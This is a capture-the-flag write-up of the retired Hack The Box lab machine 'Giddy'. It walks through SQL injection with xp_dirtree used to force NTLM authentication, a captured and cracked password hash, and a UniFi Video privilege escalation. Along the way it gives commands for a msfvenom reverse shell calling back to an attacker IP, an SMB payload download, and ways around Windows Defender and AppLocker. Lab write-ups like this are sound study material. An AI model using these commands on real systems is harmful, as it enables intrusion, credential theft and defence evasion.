# Giddy

This is the write-up for the box Giddy that got retired at the 16th February 2019.
My IP address was 10.10.14.4 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.104    giddy.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/giddy.nmap 10.10.10.104
```

```markdown
PORT     STATE SERVICE    VERSION
80/tcp   open  tcpwrapped
|_http-server-header: Microsoft-IIS/10.0
443/tcp  open  tcpwrapped
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2020-10-18T11:59:01+00:00; +4m34s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2020-10-17T11:54:54
|_Not valid after:  2021-04-18T11:54:54
|_ssl-date: 2020-10-18T11:59:02+00:00; +4m34s from scanner time.
```

## Checking HTTP & HTTPS (Port 80 & 443)

On both web pages is an image of a dog in a car that links to a Microsoft page out of scope.

Lets search for hidden directories on both sites with **Gobuster**:
```markdown
gobuster -u https://10.10.10.104 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k

gobuster -u http://10.10.10.104 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds the following directories on both sites, so they are probably identical:
- _/remote_
- _/mvc_

The directory _/remote_ shows a **Windows PowerShell Web Access** login page, that warns to use SSL for it:

![PowerShell Web Acces login](https://kyuu-ji.github.io/htb-write-up/giddy/giddy_web-1.png)

The warning disappears when browsing to it on HTTPS.

The directory _/mvc_ shows some kind of shop and the footer says that it is an **ASP.NET Application** and also has a _"Register"_ and "_Login"_ page:

![Shop page](https://kyuu-ji.github.io/htb-write-up/giddy/giddy_web-2.png)

The _search_ also takes input and when trying out a _single quote_ it shows a SQL error, which means there is potential **SQL Injection**.

### Exploiting SQL Injection Vulnerability

A request for this feature can be saved in a file and send to **SQLMap**:
```markdown
sqlmap -r giddy_search.req

sqlmap -r search.req --dbms mssql
```

But it does not give any interesting output.

There is another **SQL Injection** vulnerability in the parameter _ProductSubCategoryId_ which is an ID for the products:
```markdown
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1'--
```

We can try to let the box connect to a directory from our local client.
Lets start a listener on port 445 to see if it will send a response:
```markdown
declare @q varchar(200);
set @q='\\10.10.14.4\test';
exec master.dbo.xp_dirtree @q
```

As URL-encoded:
```markdown
GET /mvc/Product.aspx?ProductSubCategoryId=27;declare+%40q+varchar(200)%3bset+%40q%3d'\\10.10.14.4\test'%3bexec+master.dbo.xp_dirtree+%40q%3b--%2b
```

It works and sends a response back. This can be abused to set up **Responder** and steal the _NetNTLMv2 hash_ from the user:
```markdown
responder -I tun0
```

After sending the request from before again, the listener will respond back with the hash of the user _stacy_:
```markdown
[SMB] NTLMv2-SSP Client   : 10.10.10.104
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:26cc0f1af842f51d:78E925967FCF52FA9863005C0C05D7AA:0101000000000000C0653150DE09D2019AB493761D0CD25E000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000E54418D5650069271F809C3F40C1AB9BF111D06C6B17A3884F4167E4527406A90A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003400000000000000000000000000
```

The hash can be cracked with **Hashcat**:
```markdown
hashcat -m 5600 giddy_stacy.hash /usr/share/wordlists/rockyou.txt
```

After a while it gets cracked and the password for this user is:
> xNnWo6272k7x

These credentials work on the **Windows PowerShell Web Access**:
```markdown
User name:        giddy\stacy
Password:         xNnWo6272k7x
Connection type:  Computer Name
Computer name:    giddy
```

Now the PowerShell web shell is accessible:

![PowerShell Web Access](https://kyuu-ji.github.io/htb-write-up/giddy/giddy_web-3.png)

## Privilege Escalation

In this current directory _C:\Users\Stacy\Documents_ is a file called _unifivideo_ which is a software that has a known **Privilege Escalation vulnerability**:
```markdown
searchsploit unifi video
```
```markdown
Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation
```

Upon start and stop of the service, it tries to execute the file _C:\ProgramData\unifi-video\taskkill.exe_ which does not exist by default in the application directory.
So by uploading a _taskkill.exe_ to _C:\ProgramData\unifi-video_ and execute it by restarting the service, it will be possible to escalate privileges to _NT AUTHORITY/SYSTEM_.

The user _stacy_ has write permissions to this folder:
```markdown
cd C:\ProgramData\unifi-video

echo "writing" > Test.txt
```

Lets create a _taskkill.exe_ with **Msfvenom** that connects to our local client:
```markdown
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=9001 -f exe -o taskkill.exe
```

Starting the listener on **Metasploit**:
```markdown
msf5 > use exploit/multi/handler

set LHOST 10.10.14.4
set LPORT 9001
set PAYLOAD windows/meterpreter/reverse_tcp

exploit
```

Starting a SMB server on local client:
```markdown
impacket-smbserver file `pwd`
```

Downloading the file to the box:
```markdown
xcopy \\10.10.14.4\file\taskkill.exe
```

Unfortunately it does not get downloaded because **Windows Defender** removes it for being malicious.

### Bypassing Anti-Malware & AppLocker

Instead we will compile a **.NET** binary using [this Simple Reverse Shell in C#](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc).
This can be compiled with **Visual Studio on Windows** that is also installed on the box.

But I will install [dotnet on Linux via script](https://docs.microsoft.com/en-us/dotnet/core/tools/dotnet-install-script).

Building the binary:
```bash
# Starting new project
dotnet new console

# Copying code in Program.cs

# Building as single binary
dotnet publish -r win-x64 -c Release /p:PublishSingleFile=true
```

The binary is placed somewhere in _bin/Debug/netcoreapp3.1/win10-x64/_ and has to be uploaded to the box as before.

When testing if it works, the console shows a warning that running executables is blocked by group policy, which means that **AppLocker** is enabled.
There are several way to bypass AppLocker and I will use a path that gets ignored by AppLocker from the [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList).

So a binary can be placed in _C:\Windows\System32\spool\drivers\color_ and executed and AppLocker will not block it.
If the binary works, the listener will start a reverse shell session as _stacy_ on port 9002.

After renaming the _revshell.exe_ to _taskkill.exe_ it will not get deleted by Windows Defender.
```markdown
move revshell.exe taskkill.exe
```

### Exploiting the Vulnerability

The service location has to be found, to know the full name of the service.
As this user has no permissions for many commands, we will search it in the registry:
```markdown
Set-Location 'HKLM:\SYSTEM\CurrentControlSet\Services'

dir *uni*
```
```markdown
Name: UniFiVideoService
DisplayName: Ubiquiti UniFi Video
```

Restarting the service:
```markdown
Stop-Service "Ubiquiti UniFi Video"

Start-Service "Ubiquiti UniFi Video"
```

After doing this several times, the binary _taskkill.exe_ gets executed and the listener on my IP and port 9002 starts a reverse shell session as _NT AUTHORITY/SYSTEM_!
